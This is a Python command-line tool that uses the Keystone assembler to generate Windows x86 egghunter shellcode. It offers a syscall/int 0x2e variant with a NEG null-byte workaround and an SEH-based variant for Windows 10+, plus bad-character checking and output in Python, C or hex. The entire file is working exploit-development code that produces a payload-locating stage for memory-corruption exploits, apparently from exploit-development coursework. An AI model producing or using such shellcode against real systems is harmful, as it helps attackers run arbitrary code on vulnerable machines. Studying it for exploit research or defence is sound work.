#!/usr/bin/env python3
"""
Egghunter Generator Modular Tool  -  v1.2 (17‑Jul‑2025)

  old : syscall + int 0x2e (Windows XP/7) con opcion --negate
  seh : SEH‑based (Windows 10+)

Extra Options:
    Output Formats: python | c | hex
    Badchar Checker: -b "\x00\x0a"
    Save to File: -o output.txt
"""

import argparse
import sys
from keystone import Ks, KS_ARCH_X86, KS_MODE_32

# utils
def format_shellcode(buf: bytes, fmt: str = "python") -> str:
    if fmt == "python":
        return format_python_egghunter(buf)
    if fmt == "c":
        return "unsigned char egghunter[] = { " + ','.join(f"0x{b:02x}" for b in buf) + " };"
    if fmt == "hex":
        return ''.join(f"{b:02x}" for b in buf)
    raise ValueError("Format not supported")


def format_python_egghunter(buf: bytes) -> str:
    lines = ['egghunter = b""']
    for idx in range(0, len(buf), 12):
        block = buf[idx:idx + 12]
        block_hex = ''.join(f"\\x{b:02x}" for b in block)
        lines.append(f'egghunter += b"{block_hex}"')
    return "\n".join(lines)


def parse_badchars_string(s: str) -> bytes:
    s = s.replace(' ', '').lower()
    if not s:
        return b''

    if len(s) % 4 != 0 or not all(s[i:i + 2] == '\\x' for i in range(0, len(s), 4)):
        raise ValueError

    return bytes(int(s[i + 2:i + 4], 16) for i in range(0, len(s), 4))


def parse_syscall_id(s: str) -> int:
    try:
        return int(s, 0)
    except ValueError:
        raise argparse.ArgumentTypeError('Syscall ID must be hex like 0x1C9')


def check_badchars(buf: bytes, bad: bytes):
    return [(i, b) for i, b in enumerate(buf) if b in bad]


def assemble(asm: str) -> bytes:
    # remove every no-ASCII char
    asm_clean = asm.encode('ascii', 'ignore').decode()
    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    encoding, _ = ks.asm(asm_clean)
    return bytes(encoding)



def build_old(tag: str, syscall_id: int, negate=False) -> bytes:    #classic generator
    tag_hex = int.from_bytes(tag.encode('ascii'), 'little')
    if negate:
        syscall_neg = (-syscall_id) & 0xFFFFFFFF
        mov_eax = f"mov eax, 0x{syscall_neg:08x}\nneg eax"
    else:
        mov_eax = f"push 0x{syscall_id:x}\npop eax"

    asm = f"""
loop_inc_page:
    or dx, 0x0fff
loop_inc_one:
    inc edx
loop_check:
    push edx
{mov_eax}
    int 0x2e
    cmp al, 0x5
    pop edx
    je loop_inc_page
is_egg:
    mov eax, 0x{tag_hex:08x}
    mov edi, edx
    scasd
    jnz loop_inc_one
    scasd
    jnz loop_inc_one
match:
    jmp edi
"""
    return assemble(asm)


def build_seh(tag: str) -> bytes: #seh egghunter generator
    tag_be = tag.encode('ascii')[::-1]  # w00t -> little-endian reversed
    asm = f"""
jmp get_seh_address
build_exception_record:
    pop ecx
    mov eax, 0x{tag_be.hex()}
    push ecx
    push 0xffffffff
    xor ebx, ebx
    mov dword ptr fs:[ebx], esp
    sub ecx, 0x04
    add ebx, 0x04
    mov dword ptr fs:[ebx], ecx
is_egg:
    push 0x02
    pop ecx
    mov edi, ebx
    repe scasd
    jnz loop_inc_one
    jmp edi
loop_inc_page:
    or bx, 0xfff
loop_inc_one:
    inc ebx
    jmp is_egg
get_seh_address:
    call build_exception_record
    push 0x0c
    pop ecx
    mov eax, [esp+ecx]
    mov cl, 0xb8
    add dword ptr ds:[eax+ecx], 0x06
    pop eax
    add esp, 0x10
    push eax
    xor eax, eax
    ret
"""
    return assemble(asm)


def main():
    ap = argparse.ArgumentParser(description="Egghunter generator for Windows x86")
    ap.add_argument("-t", "--tag", required=True, help="TAG (ej: w00t)")
    ap.add_argument("-v", "--variant", choices=["old", "seh"], default="old")
    ap.add_argument("-s", "--syscall", type=parse_syscall_id, default=0x2, help="Syscall ID hex string (e.g. 0x1C9)")
    ap.add_argument("-n", "--negate", action="store_true", help="Use NEG to avoid null bytes")
    ap.add_argument("-b", "--badchars", default="", help=r'Badchars: "\x00\x0a"')
    ap.add_argument("-f", "--format", choices=["python", "c", "hex"], default="python")
    ap.add_argument("-o", "--outfile", help="Save to file")
    args = ap.parse_args()

    if len(args.tag) != 4 or not args.tag.isascii():
        sys.exit("ERROR: TAG must be 4 chars wide ASCII.")

    try:
        bad = parse_badchars_string(args.badchars)
    except ValueError:
        sys.exit(r'ERROR: Badchars must use string format, e.g. -b "\x00\x0a\xff"')

    if args.variant == "old":
        sc = build_old(args.tag, args.syscall, args.negate)
    else:
        sc = build_seh(args.tag)

    out = format_shellcode(sc, args.format)
    bad_list = check_badchars(sc, bad)

    hunter_type = "syscall" if args.variant == "old" else "seh"
    print(f"\n[+] Egghunter created successfully!")
    print(f"[=]   Type:          {hunter_type}")
    print(f"[=]   TAG:           {args.tag}")
    if args.variant == "old":
        print(f"[=]   Syscall ID:    0x{args.syscall:X}")
        print(f"[=]   NEG syscall:   {'yes' if args.negate else 'no'}")
        print(f"[!]   check syscall in cdb.exe with: u ntdll!NtAccessCheckAndAuditAlarm")
    print(f"[=]   Total len:     {len(sc)} bytes (0x{len(sc):x})")

    if bad_list:
        print(f"\n[!] Badchars detected:")
        for off, b in bad_list:
            print(f"  Offset {off:02}: \\x{b:02x}")
    else:
        print("[=]   Badchars:      clean")

    print("\n" + out + "\n")

    if args.outfile:
        with open(args.outfile, "w") as f:
            f.write(out)
        print(f"[+] Saved to {args.outfile}")


if __name__ == "__main__":
    main()
